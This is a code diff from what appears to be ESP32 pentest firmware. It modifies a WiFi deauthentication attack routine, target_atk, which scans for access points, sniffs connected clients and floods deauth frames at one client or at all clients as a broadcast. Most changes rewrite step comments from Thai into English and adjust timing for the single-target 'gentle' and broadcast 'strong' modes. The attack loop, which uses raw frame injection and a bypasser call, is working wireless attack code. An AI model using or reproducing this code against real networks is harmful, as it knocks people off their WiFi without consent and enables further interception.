@@ -835,12 +835,13 @@ String getOUI(uint8_t *mac) {
 
 //-----------[Main]-----------------
 
-void target_atk() {
+void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
     cleanlyStopWebUiForWiFiFeature();
     if (!wifi_atk_setWifi()) return;
 
-    // ──────────── Step 1 : เลือก AP ────────────
+    // ==================== STEP 1: AP SCAN ====================
+    // (เราไม่ใช้ค่า tssid/mac/channel ที่ส่งมา แต่ไปสแกนใหม่เอง)
     String apSSID, apMAC;
     uint8_t apChannel = 0;
     bool apChosen = false;
@@ -891,7 +892,7 @@ void target_atk() {
         delay(50);
     }
 
-    // ──────────── Step 2 : เปิดดัก client ────────────
+    // ==================== STEP 2: PREPARE BSSID & SNIFF CLIENTS ====================
     sscanf(apMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &g_targetBssid[0], &g_targetBssid[1], &g_targetBssid[2],
            &g_targetBssid[3], &g_targetBssid[4], &g_targetBssid[5]);
@@ -906,6 +907,7 @@ void target_atk() {
     esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous(true);
 
+    // หน่วงให้มี client บ้าง
     unsigned long t0 = millis();
     while (millis() - t0 < 2000) {
         delay(50);
@@ -917,7 +919,7 @@ void target_atk() {
         }
     }
 
-    // ──────────── Step 3 : เลือกเป้าหมาย ────────────
+    // ==================== STEP 3: CHOOSE TARGET ====================
     uint8_t *targetMac = nullptr;
     String targetName = "Broadcast";
     bool targetChosen = false;
@@ -987,7 +989,7 @@ void target_atk() {
         delay(50);
     }
 
-    // ──────────── Step 4 : เตรียม deauth frame ────────────
+    // ==================== STEP 4: SETUP DEAUTH FRAME ====================
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     bool isBroadcast = (targetMac == nullptr);
     if (isBroadcast) {
@@ -999,7 +1001,7 @@ void target_atk() {
         esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
     }
 
-    // ──────────── Step 5 : attack loop ────────────
+    // ==================== STEP 5: ATTACK LOOP ====================
     const uint8_t TOP_MARGIN = 2, INFO_H = 60;
     const uint8_t CLIENT_HEADER_H = 14, ROW_H = 14, MAX_ROWS = 6;
     const uint8_t TABLE_Y = TOP_MARGIN + INFO_H + CLIENT_HEADER_H;
@@ -1023,9 +1025,10 @@ void target_atk() {
         if (EscPress) break;
 
         if (!paused) {
-            // 💡 แยกจำนวนรอบตามโหมด
-            int loopCount = isBroadcast ? 100 : 10;          // Broadcast = 100, Single = 10
-            int frameDelay = isBroadcast ? 0 : 3;            // Single Client ดีเลย์ 3ms ระหว่าง send_raw_frame
+            // 💡 แยกโหมด Broadcast (แรง) / Single (นุ่มนวล)
+            int loopCount = isBroadcast ? 100 : 5;
+            int frameDelay = isBroadcast ? 0 : 8;
+            int burstPause = isBroadcast ? 0 : 50;
 
             for (int i = 0; i < loopCount; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
@@ -1033,17 +1036,18 @@ void target_atk() {
                 totalFrames += 3;
                 if (EscPress) break;
 
-                if (!isBroadcast) delay(frameDelay);       // ดีเลย์เฉพาะโหมดเจาะจง
+                if (!isBroadcast) delay(frameDelay);
 
                 bool s = check(SelPress);
                 if (s && !lastSel) { paused = !paused; lastUI = 0; }
                 lastSel = s;
                 if (paused) break;
             }
+            if (!isBroadcast) delay(burstPause);
 
             // refresh channel ตามโหมด
             static uint16_t refCnt = 0;
-            refCnt += (loopCount * 3);                       // นับเฟรมตามจริง
+            refCnt += (loopCount * 3);
             if (refCnt >= 3000) {
                 if (isBroadcast)
                     wsl_bypasser_send_raw_frame(&target_ap, apChannel, _default_target);
@@ -1055,7 +1059,7 @@ void target_atk() {
             delay(50);
         }
 
-        // clean
+        // clean client list
         if (millis() - lastClean > CLEAN_MS) {
             lastClean = millis();
             unsigned long nw = millis();
@@ -1068,7 +1072,7 @@ void target_atk() {
             }
         }
 
-        // footer
+        // footer progress bar
         if (millis() - lastFooter > FOOTER_MS) {
             lastFooter = millis();
             tft.fillRect(0, tftHeight - 14, tftWidth, 14, bruceConfig.bgColor);
